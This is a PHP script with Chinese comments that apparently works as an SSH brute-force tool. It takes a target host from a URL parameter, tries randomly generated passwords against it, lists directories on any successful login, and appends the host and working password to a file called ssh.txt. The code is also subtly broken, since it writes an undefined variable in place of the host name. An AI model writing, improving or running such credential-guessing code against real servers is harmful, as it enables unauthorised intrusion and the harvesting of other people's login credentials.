<?php
ini_set('max_execution_time', '0');
ini_set("display_errors" , "On");
error_reporting(E_ALL | E_STRICT);

$vps=$_GET['name'];
	//引入ssh文件，ping到可用IP，链接并写入数组
	include('ssh.php');
	$number=mt_rand(100000,999999);
	$str='';
	for($j=1;$j<=8;$j++){
		$rand=mt_rand(1,3);
		switch($rand){
			case 1 :
				$str.=mt_rand(0,9);break;
			case 2 :
				$rou1=mt_rand(65,90);
				$str.=chr($rou1);
				break;
			case 3 :
				$rou2=mt_rand(97,122);
				$str.=chr($rou2);
		}
	}
	$string='';
	for($i=1;$i<=6;$i++){
		$rou3=mt_rand(97,122);
		$string.=chr($rou3);
	}
	$arr=[$str,$string,$number];		
	
	//循环身份验证，并列出目录
	if(empty($vps[0])) exit;
	
			$ssh=new FizzSSH($vps);
			if($obj=$ssh->connection){
				foreach($arr as $val2){
					echo $vps,'=>',$val2;
					$h=$ssh->cli($obj,$val2);
					if($h){
						$list=$ssh->run();
						echo $list,'<br/>';
						$light=strlen($list);
						if($light > 5){
							if($rou=fopen('ssh.txt','a+')){
								$data=$value.'=>'.$val2."\r\n";
								fwrite($rou,$data);
								fclose($rou);
							}
						}
					}
				}
			}
		
